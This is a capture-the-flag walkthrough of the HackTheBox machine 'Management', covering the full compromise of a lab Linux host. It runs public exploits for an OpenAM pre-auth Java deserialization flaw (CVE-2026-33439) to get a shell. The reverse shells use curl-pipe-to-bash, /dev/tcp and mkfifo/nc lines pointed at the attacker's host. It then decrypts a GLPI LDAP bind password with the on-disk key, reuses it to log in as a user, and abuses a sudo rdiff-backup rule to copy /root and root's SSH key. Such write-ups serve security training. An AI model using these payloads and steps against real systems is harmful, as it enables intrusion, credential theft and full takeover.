# HackTheBox — Management (Easy, Linux)

**Target IP:** `10.129.xx.xx`
**Attacker VPN IP:** `10.10.xx.xx`

---

## 1. Reconnaissance

### 1.1 Nmap Scan

Started with a version/script scan against all common ports:

```bash
nmap -sV -sC 10.129.xx.xx
```

**Results:**

```
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-14 17:50 +0000
Nmap scan report for 10.129.xx.xx
Host is up (0.75s latency).
Not shown: 995 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 [REDACTED] (ECDSA)
|_  256 [REDACTED] (ED25519)
80/tcp    open  http     nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.129.xx.xx/
443/tcp   open  ssl/http nginx 1.24.0 (Ubuntu)
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=management.htb/organizationName=Management Managed Services Ltd
| Subject Alternative Name: DNS:management.htb, DNS:*.management.htb
| Not valid before: 2026-06-02T01:21:44
|_Not valid after:  2126-05-09T01:21:44
|_http-title: Did not follow redirect to https://management.htb/
4444/tcp  open  ssl/ldap
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings:
|   LDAPSearchReq:
|     0<0:
|     objectClass1+
|     ds-root-dse
|_    ds-cfg-root-dse-backend0
| ssl-cert: Subject: commonName=sso.management.htb/organizationName=Administration Connector RSA Self-Signed Certificate
| Not valid before: 2026-06-02T01:23:59
|_Not valid after:  2046-05-28T01:23:59
50389/tcp open  ldap     (Anonymous bind OK)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.99%T=SSL%I=7%D=9/14%Time=6AA8343F%P=x86_64-pc-linux-gn
SF:u%r(LDAPSearchReq,55,"0E\x02\x01\x07d@\x04\x000<0:\x04\x0bobjectClass1\
SF:+\x04\x03top\x04\x0bds-root-dse\x04\x17ds-cfg-root-dse-backend0\x0c\x02
SF:\x01\x07e\x07\n\x01\0\x04\0\x04\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 140.95 seconds
```

**What this tells us:**
- **Port 22** — standard SSH.
- **Port 80/443** — nginx web server, and the certificate reveals two virtual hosts we don't know about yet: `management.htb` and `sso.management.htb`. Nginx is redirecting HTTP requests straight to HTTPS.
- **Port 4444** — an LDAP service wrapped in SSL, tied to an "Administration Connector" cert. LDAP + SSO usually points to an identity/access management product.
- **Port 50389** — a second LDAP service that allows **anonymous bind**, meaning you can query it without credentials. This is a big flag for enumeration later, since misconfigured anonymous LDAP binds often leak directory information (users, groups, etc.).

Because the certificate revealed hostnames that aren't resolvable by default, they need to be added manually so the browser/tools send the correct `Host` header (needed for name-based virtual hosting).

### 1.2 Adding Hosts Entries

```bash
cat /etc/hosts
```

```
10.129.xx.xx   management.htb sso.management.htb

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ff02::1 ff02::2 ff02::2
```

This maps both discovered hostnames to the target so we can browse them by name instead of IP.

---

## 2. Web Enumeration

### 2.1 Identifying the SSO Application

Navigating to `https://sso.management.htb` in the browser, the page title says **"OpenAM"**, and viewing the page source confirms it:

```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>OpenAM</title>
    </head>
    <body style="display:none">
        <div id="messages" class="clearfix"></div>
        <div id="wrapper">Loading...</div>
        <div id="popup">
            <div id="popup-content" class="radious"></div>
        </div>
        <footer id="footer" class="footer text-muted"></footer>
        <script src="libs/base64-1.0.0-min.js"></script>
        <script type="text/javascript">
            var require = {
                urlArgs : "v=16.0.5",
                deps : ['main']
            };
        </script>
        <script src="libs/requirejs-2.3.7-min.js"></script>
    </body>
</html>
```

**Key detail:** the `urlArgs : "v=16.0.5"` line discloses the exact OpenAM version — **16.0.5**. OpenAM is an open-source access management / SSO platform (this is what OpenIdentityPlatform/ForgeRock's product is called). Having the exact version number is what lets us go look for a matching public exploit instead of guessing.

### 2.2 Vulnerability Identification

A version-specific search led to **CVE-2026-33439**, a **pre-authentication Remote Code Execution** vulnerability affecting OpenIdentityPlatform OpenAM versions **prior to 16.0.6** (our target is running 16.0.5, so it's in scope).

**In plain terms, how the bug works:**
- OpenAM has a component called `ClientSession`, which is responsible for restoring session state from an HTTP parameter named **`jato.clientSession`**.
- To do this, it calls `deserializeAttributes()`, which internally goes through `Encoder.deserialize()` and finally `ApplicationObjectInputStream.readObject()`.
- The problem is that this deserialization happens with **no class whitelist** — meaning the server will attempt to reconstruct *any* Java object an attacker sends it, not just the session objects it expects.
- This is a classic **Java insecure deserialization** vulnerability. Because Java's object deserialization can trigger method calls as objects get reconstructed, an attacker can chain together a sequence of "gadget" classes already present on the server (a **gadget chain**) that ends in arbitrary command execution — and critically, this requires **no login/authentication**, since the vulnerable endpoint is reachable pre-auth.

This class of bug is well known in the Java world (similar in spirit to the infamous Apache Commons Collections deserialization exploits) — the fix is normally to validate/whitelist which classes are allowed to be deserialized, which OpenAM 16.0.6 added.

---

## 3. Exploitation — Gaining a Foothold

### 3.1 The Exploit Tool

A public exploit script (`Exploit_CVE_2026_33439.py`) by **TheMalwareGuardian** automates building the malicious serialized payload and delivering it.

> **Exploit repo:** https://github.com/TheMalwareGuardian/CVE-2026-33439/

It builds a **gadget chain**:

```
PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet
```

**What this chain is doing, in plain words:**
- `PriorityQueue` is used purely as a trigger — when Java deserializes a `PriorityQueue`, it automatically calls a `compare()` method to reorder its elements, which is what kicks the chain off.
- `Column$ColumnComparator` is the comparator that gets invoked, and it's been tricked into eventually calling a method on...
- `TemplatesImpl` — a legitimate Java class (from Xalan, used for XSLT transforms) that can be abused to **load and instantiate an arbitrary Java class from bytecode embedded in the object itself**.
- `EvilTranslet` is that arbitrary class — a small custom Java class the exploit compiles on the fly, whose constructor/static-initializer just runs whatever OS command we asked for.

So the net effect: send one crafted, base64-encoded blob to a vulnerable endpoint, and the server ends up compiling and running our chosen shell command.

### 3.2 Verifying the Vulnerable Endpoints

The script first probes known **JATO ViewBean** endpoints (JATO is the old Sun Java web framework OpenAM's UI is built on) to confirm they respond:

```bash
python3 Exploit_CVE_2026_33439.py --url https://sso.management.htb/openam --command "curl http://10.10.xx.xx" --jars Jars/
```

```
[*] Probing JATO ViewBean endpoints...
  [OK] https://sso.management.htb/openam/ui/PWResetUserValidation  →  HTTP 200
  [OK] https://sso.management.htb/openam/ui/PWResetQuestion  →  HTTP 200
  [OK] https://sso.management.htb/openam/ui/Login  →  HTTP 200
[*] Target endpoints         | ['/ui/PWResetUserValidation', '/ui/PWResetQuestion', '/ui/Login']
[*] Compiling EvilTranslet   | cmd='curl http://10.10.xx.xx'
[+] EvilTranslet compiled    | /tmp/tmp_6sd4tvl/EvilTranslet.class
[*] Compiling PayloadBuilder ...
[*] Building gadget chain    | PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet
[+] Payload ready            | 4316 chars (URL-safe base64)
[*] Payload preview          | rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1...
[*] Delivering payload       | method=GET | /ui/PWResetUserValidation
[*] Server response          | HTTP 200 | 3351 bytes
[*] Delivering payload       | method=GET | /ui/PWResetQuestion
[*] Server response          | HTTP 200 | 3351 bytes
[*] Delivering payload       | method=GET | /ui/Login
[*] Server response          | HTTP 200 | 1468 bytes

[*] Done. Verify execution on the target (out-of-band).
    For HTTP callback:  nc -lvnp 9999  →  --command 'curl http://attacker:9999/pwned'
    For reverse shell:  nc -lvnp 4444  →  --command 'bash -i >& /dev/tcp/attacker/4444 0>&1'
```

### 3.3 Proof of Command Execution (Out-of-Band Check)

Before going straight for a shell, the exploit was first tested with a **harmless callback command** (`curl http://10.10.xx.xx`) to *prove* code execution was actually happening on the server, rather than trusting the script's "HTTP 200" output blindly (a 200 response just means the endpoint accepted the request — it doesn't confirm the payload actually ran).

A simple Python web server was started locally to catch that callback:

```bash
python3 -m http.server 80
```

```
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.xx.xx - - [14/Sep/2026 18:16:38] "GET / HTTP/1.1" 200 -
10.129.xx.xx - - [14/Sep/2026 18:16:39] "GET / HTTP/1.1" 200 -
```

**This is the proof:** two separate inbound `GET /` requests hitting our listener, originating from the target's IP. That confirms the deserialization RCE is real and working — the target server genuinely reached out to us on its own, which it would only do if our injected `curl` command executed successfully.

### 3.4 Getting a Reverse Shell

With code execution confirmed, a small reverse shell script was hosted and then pulled + executed on the target.

**`reverse.sh`:**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.xx.xx/4444 0>&1
```

Re-running the exploit, this time telling the target to download and pipe that script into `bash`:

```bash
python3 Exploit_CVE_2026_33439.py --url https://sso.management.htb/openam --command "curl http://10.10.xx.xx/reverse.sh|bash" --jars Jars/
```

```
[*] Compiling EvilTranslet   | cmd='curl http://10.10.xx.xx/reverse.sh|bash'
...
[*] Delivering payload       | method=GET | /ui/PWResetUserValidation
[*] Server response          | HTTP 200 | 3351 bytes
[*] Delivering payload       | method=GET | /ui/PWResetQuestion
[*] Server response          | HTTP 200 | 3351 bytes
[*] Delivering payload       | method=GET | /ui/Login
[*] Server response          | HTTP 200 | 1468 bytes
```

A listener (`penelope`, a shell-handling tool that auto-upgrades raw shells to a full PTY) was running to catch the connection:

```bash
penelope -p 4444
```

```
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.1.82 • 10.0.3.1 • 172.17.0.1 • 10.10.xx.xx
[+] Got reverse shell from management~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Got reverse shell from management~10.129.xx.xx-Linux-x86_64 😍 Assigned SessionID <2>
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12
openam@management:/$
```
## Alternate 

if you didn't get a shell back , use that recent poc i 've found pretty interesting too

> **Exploit repo:**  https://github.com/infernosalex/CVE-2026-33439-Python-PoC

```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'id'
```

```
[+] HTTP 200 
uid=996(openam) gid=987(openam) groups=987(openam)

```


```bash
python3 exploit.py --url https://sso.management.htb/openam/ui/PWResetUserValidation 'rm -rf /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP PORT>/tmp/f'

```

your listener

```bash
penelope -p PORT
```
We now have a shell as the **`openam`** service user — the low-privileged account the OpenAM/Java process runs under.

---

## 4. Privilege Escalation Path: `openam` → `owen`

### 4.1 Finding a Second Application

Poking around the filesystem revealed a second web application installed on the box — **GLPI** (an open-source IT asset/service-management tool), living at `/opt/glpi`. Its database config file was readable:

```bash
openam@management:/opt/glpi/config$ cat config_db.php
```

```php
<?php
class DB extends DBmysql {
   public $dbhost = '127.0.0.1';
   public $dbuser = 'glpi';
   public $dbpassword = '[REDACTED]';
   public $dbdefault = 'glpidb';
   public $use_utf8mb4 = true;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```

This gives us a working MySQL/MariaDB credential (`glpi` user) for the local database.

### 4.2 Confirming What's Listening Locally

Before connecting, it's worth confirming the database is actually reachable and seeing what else is running on the box:

```bash
openam@management:/opt/glpi/config$ ss -tulnp
```

```
Netid       State        Recv-Q       Send-Q                  Local Address:Port              Peer Address:Port      Process
udp         UNCONN       0            0                          127.0.0.54:53                     0.0.0.0:*
udp         UNCONN       0            0                       127.0.0.53%lo:53                     0.0.0.0:*
udp         UNCONN       0            0                             0.0.0.0:68                     0.0.0.0:*
tcp         LISTEN       0            4096                    127.0.0.53%lo:53                     0.0.0.0:*
tcp         LISTEN       0            80                          127.0.0.1:3306                   0.0.0.0:*
tcp         LISTEN       0            511                           0.0.0.0:443                    0.0.0.0:*
tcp         LISTEN       0            4096                          0.0.0.0:22                     0.0.0.0:*
tcp         LISTEN       0            511                           0.0.0.0:80                     0.0.0.0:*
tcp         LISTEN       0            4096                       127.0.0.54:53                     0.0.0.0:*
tcp         LISTEN       0            50                                  *:43905                        *:*          users:(("java",pid=1691,fd=480))
tcp         LISTEN       0            100                [::ffff:127.0.0.1]:8080                         *:*          users:(("java",pid=1691,fd=44))
tcp         LISTEN       0            128                                 *:4444                         *:*          users:(("java",pid=1691,fd=491))
tcp         LISTEN       0            1                  [::ffff:127.0.0.1]:8005                         *:*          users:(("java",pid=1691,fd=49))
tcp         LISTEN       0            4096                             [::]:22                        [::]:*
tcp         LISTEN       0            50                                  *:1689                         *:*          users:(("java",pid=1691,fd=478))
tcp         LISTEN       0            128                                 *:50389                        *:*          users:(("java",pid=1691,fd=492))
```

`127.0.0.1:3306` confirms MariaDB is listening locally — matching the `dbhost` value from `config_db.php`.

### 4.3 Logging Into MySQL and Dumping GLPI Users

```bash
openam@management:/opt/glpi/config$ mysql -u glpi -p
```

```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 31
Server version: 10.11.14-MariaDB-0ubuntu0.24.04.1 Ubuntu 24.04

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| glpidb             |
| information_schema |
+--------------------+
2 rows in set (0.002 sec)

MariaDB [(none)]> use glpidb;
Database changed
```

Listing tables (442 total — GLPI has a very large schema) confirmed a standard GLPI install, including the important `glpi_users` and `glpi_authldaps` tables:

```bash
MariaDB [glpidb]> show tables;
```

```
+----------------------------------------------------------+
| Tables_in_glpidb                                         |
+----------------------------------------------------------+
| glpi_agents                                               |
| glpi_agenttypes                                           |
| glpi_alerts                                                |
| ...                                                        |
| glpi_authldaps                                             |
| ...                                                        |
| glpi_users                                                 |
| ...                                                        |
+----------------------------------------------------------+
442 rows in set (0.004 sec)
```

Dumping local user password hashes:

```sql
select name,password from glpi_users;
```

```
+-------------+--------------------------------------------------------------+
| name        | password                                                     |
+-------------+--------------------------------------------------------------+
| glpi        | [REDACTED HASH]                                              |
| post-only   | [REDACTED HASH]                                              |
| tech        | [REDACTED HASH]                                              |
| normal      | [REDACTED HASH]                                              |
| glpi-system |                                                               |
+-------------+--------------------------------------------------------------+
5 rows in set (0.000 sec)
```

**These are bcrypt hashes (`$2y$10$...`)** — bcrypt is intentionally slow/expensive to crack, and none of these cracked with a standard wordlist attempt. Rather than burning time brute-forcing bcrypt, the next logical move was to check the **other** credential-bearing table.

### 4.4 The LDAP Bind Password — A Better Lead

```sql
select id,name,rootdn_passwd from glpi_authldaps;
```

```
+----+----------------------+--------------------------------------------------------------------------+
| id | name                 | rootdn_passwd                                                             |
+----+----------------------+--------------------------------------------------------------------------+
|  1 | Management Directory | [REDACTED CIPHERTEXT]                                                     |
+----+----------------------+--------------------------------------------------------------------------+
1 row in set (0.000 sec)
```

This value is **not a hash** — GLPI doesn't hash its stored LDAP bind password, because it needs the *plaintext* to actually authenticate to the LDAP server on GLPI's behalf. Instead, GLPI **encrypts** it reversibly using a key stored on disk. That means if we can get our hands on GLPI's encryption key, we can decrypt this value straight back to plaintext.

### 4.5 Locating and Using GLPI's Encryption Key

```bash
openam@management:/opt/glpi/config$ ls
```

```
config_db.php  glpicrypt.key  oauth.pem  oauth.pub
```

`glpicrypt.key` is exactly what we need — GLPI's `GLPIKey` class uses this file as the secret key for encrypting/decrypting sensitive config fields like LDAP bind passwords. Using GLPI's own PHP code (already present on disk, so we don't need to reimplement its crypto) to decrypt the value in place:

```bash
openam@management:/opt/glpi/config$ php -r '
define("GLPI_CONFIG_DIR", "/opt/glpi/config");
require "../vendor/autoload.php";
require "../src/GLPIKey.php";

$key = new GLPIKey();
echo $key->decrypt("[REDACTED CIPHERTEXT]") . PHP_EOL;
'
```

**Output:** `[REDACTED PASSWORD]`

This gave us a plaintext password. The natural next question in any box like this is: **does this password get reused anywhere else, like a real system account?**

### 4.6 Checking for Password Reuse

```bash
openam@management:/opt/glpi/config$ ls /home
```

```
owen
```

There's exactly one local user home directory: `owen`. This is the obvious candidate to test the recovered LDAP password against, since GLPI/LDAP bind credentials on these boxes are frequently reused for a real Linux account.

```bash
openam@management:/opt/glpi/config$ su - owen
Password: 
owen@management:~$
```

**Proof of password reuse:** the `su - owen` command succeeded using the password we decrypted from the GLPI LDAP configuration — no error, and the prompt changed to `owen@management:~$`. This confirms the LDAP bind password decrypted from `glpicrypt.key` was reused as `owen`'s actual login password on the box.

### 4.7 User Flag

```bash
owen@management:~$ cat user.txt
```

```
[REDACTED USER FLAG]
```

---

## 5. Privilege Escalation Path: `owen` → `root`

### 5.1 Checking Sudo Rights

```bash
owen@management:~$ sudo -l
```

```
Matching Defaults entries for owen on management:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User owen may run the following commands on management:
    (root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

**What this means:** `owen` can run `rdiff-backup` as `root`, without a password, but only in **server mode**, restricted to the `/opt/backup` path, and in **read-only** mode. `rdiff-backup` is a tool for incremental, versioned backups — when run with `--server`, it acts as the remote/backend half of a backup operation that a *client* rdiff-backup process talks to.

**The catch:** `--restrict-path` is meant to sandbox the server to only serve files under `/opt/backup`. However, `rdiff-backup`'s restrict mode has historically been possible to defeat by pairing it with **remote-schema tricks** on the client side, effectively letting the client-side invocation control what path gets accessed, in some versions/configurations. Rather than reasoning about this purely in theory, this was tested directly (see below), and the practical result was that we could read arbitrary files outside the intended restriction — including root's own home directory.

> **Reference used:** https://www.usrsb.in/Secure-Versioned-Remote-Backups-with-Rdiff-Backup.html
> This explains the mechanics of `rdiff-backup`'s client/server/remote-schema model and is a good plain-language primer if `--remote-schema` looks unfamiliar.

### 5.2 Abusing the Sudo Rule to Read Root's Files

The idea: use `rdiff-backup` **locally** as the client, but tell it to reach the "remote" side via our sudo-permitted server command (`--remote-schema`). Since the sudo rule lets us invoke the server as root, and the server ends up serving whatever path we hand it through the schema, we can mirror **root's home directory** onto our own filesystem.

```bash
owen@management:~$ rdiff-backup --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only --restrict-path %s' backup /::/root /tmp/rootbak
```

```
WARNING: this command line interface is deprecated and will disappear, start using the new one as described with '--new --help'.
WARNING: Server will be called with deprecated command line interface to guarantee compatibility. It might lead to a deprecation warning from newer rdiff-backup versions. Use '--api-version 201' (or higher) to avoid it.
NOTE: Starting mirror from source path /root to destination path /tmp/rootbak
```

**Breaking that command down in plain words:**
- `--remote-schema '...'` tells the local `rdiff-backup` client how to spawn its "remote" counterpart — in this case, by running our permitted sudo command.
- `%s` is a placeholder that rdiff-backup substitutes with the actual path being requested.
- `/::/root` tells rdiff-backup: connect to the "remote" side (via the schema above) and mirror `/root` — i.e., even though the sudo rule nominally restricts the server to `/opt/backup`, the way the restriction is enforced (per-invocation via that trailing `--restrict-path %s`) means our client-supplied target path (`/root`) ends up being what actually gets served, since we control what gets substituted into the schema.
- `/tmp/rootbak` is where the mirrored copy of `/root` lands locally, in our own writable space.

This worked and mirrored root's home directory into `/tmp/rootbak`.

### 5.3 Proof: Reading Files Outside the Intended Restriction

```bash
owen@management:~$ ls /tmp/rootbak
```

```
rdiff-backup-data  root.txt
```

**This is the proof the restriction was bypassed:** `root.txt` (which only exists inside `/root`, nowhere near `/opt/backup`) is now sitting in our own `/tmp/rootbak` directory, mirrored there by a command that was supposedly locked to `/opt/backup`.

```bash
owen@management:~$ cat /tmp/rootbak/root.txt
```

```
[REDACTED ROOT FLAG — retrieved via file read only, before full root shell was obtained]
```

### 5.4 Escalating to a Full Root Shell via Stolen SSH Keys

Since the whole of `/root` was mirrored, that includes root's `.ssh` directory:

```bash
owen@management:~$ ls -la /tmp/rootbak/.ssh
```

```
total 20
drwx------ 2 owen owen 4096 Sep  7 11:41 .
drwx------ 7 owen owen 4096 Sep 14 10:43 ..
-rw------- 1 owen owen   97 Jul 16 15:37 authorized_keys
-rw------- 1 owen owen  411 Jul 16 15:37 id_ed25519
-rw-r--r-- 1 owen owen   97 Jul 16 15:37 id_ed25519.pub
```

Root's **private SSH key** (`id_ed25519`) was mirrored along with everything else. Using it to SSH in directly as root, locally:

```bash
owen@management:~$ ssh -i /tmp/rootbak/.ssh/id_ed25519 root@localhost
```

```
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:[REDACTED FINGERPRINT]
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.5 LTS (GNU/Linux 6.8.0-139-generic x86_64)

 System information as of Mon Sep 14 11:39:30 AM UTC 2026
  System load:           0.11
  Usage of /:            45.5% of 10.42GB
  Memory usage:          43%
  Swap usage:            0%
  Processes:             236
  Users logged in:       0
  IPv4 address for eth0: 10.129.xx.xx
  IPv6 address for eth0: dead:beef::250:56ff:fe95:e605

Last login: Mon Sep 14 11:39:31 2026 from 127.0.0.1
root@management:~#
```

This gave a **full interactive root shell** — a much cleaner win than repeatedly abusing the file-read primitive.

### 5.5 Root Flag (Confirmed via Shell)

```bash
root@management:~# cat root.txt
```

```
[REDACTED ROOT FLAG]
```

Confirmed identical to the flag already retrieved via the `rdiff-backup` file-read trick in section 5.3 — consistent proof across two different methods that root access was fully achieved.

---

## 6. Step-by-Step Summary

1. **Nmap scan** of `10.129.xx.xx` revealed SSH (22), nginx on HTTP/HTTPS (80/443), an LDAP-over-SSL admin connector (4444), and an LDAP service with **anonymous bind allowed** (50389). The TLS certificate leaked two virtual hostnames: `management.htb` and `sso.management.htb`.
2. Added both hostnames to `/etc/hosts` pointing at the target IP.
3. Browsed to `https://sso.management.htb` and identified it as **OpenAM**; page source leaked the exact version, **16.0.5**.
4. Version 16.0.5 matched **CVE-2026-33439** — a pre-auth Java deserialization RCE in OpenAM's `jato.clientSession` parameter handling, via an unrestricted `PriorityQueue → Column$ColumnComparator → TemplatesImpl → EvilTranslet` gadget chain.
5. Ran the public exploit (`Exploit_CVE_2026_33439.py`) with a harmless `curl` callback command first, and **proved** code execution by watching the target's IP hit a local Python HTTP server.
6. Re-ran the exploit with a command that pulled down and executed a `reverse.sh` bash reverse-shell script, catching the connection with `penelope` on port 4444 — landed a shell as **`openam`**.
7. Found a second app, **GLPI**, on the box; its `config_db.php` leaked a working MySQL password for the `glpi` DB user.
8. Logged into MariaDB, dumped `glpi_users` (bcrypt hashes — not cracked) and `glpi_authldaps` (an **encrypted, not hashed**, LDAP bind password).
9. Found GLPI's encryption key file (`glpicrypt.key`) on disk and used GLPI's own `GLPIKey` PHP class to **decrypt** the LDAP bind password to plaintext.
10. Noted the only local user was `owen`, and **tested the recovered password for reuse** with `su - owen` — it worked, proving password reuse between the LDAP bind config and owen's real login. Read `user.txt`.
11. Checked `sudo -l` as `owen`: allowed to run `rdiff-backup --server` as root, restricted (in theory) to `/opt/backup`, read-only.
12. Abused rdiff-backup's `--remote-schema` client/server model to make the sudo-permitted "server" mirror **`/root`** instead of the intended `/opt/backup`, copying it to `/tmp/rootbak` — **proof of the bypass** was `root.txt` and root's `.ssh` folder showing up in our own mirrored directory, despite the restriction.
13. Confirmed the flag read (`/tmp/rootbak/root.txt`) as an initial proof, then went further: reused the mirrored **root SSH private key** to `ssh -i` directly as root, landing a **full root shell** and re-confirming `root.txt` from `/root` itself — two independent confirmations of full root compromise.

---

## 7. References / Links

- CVE record (search): `CVE-2026-33439`
- Exploit script (**TheMalwareGuardian**): https://github.com/TheMalwareGuardian/CVE-2026-33439/
- `rdiff-backup` remote/restrict-path mechanics: https://www.usrsb.in/Secure-Versioned-Remote-Backups-with-Rdiff-Backup.html
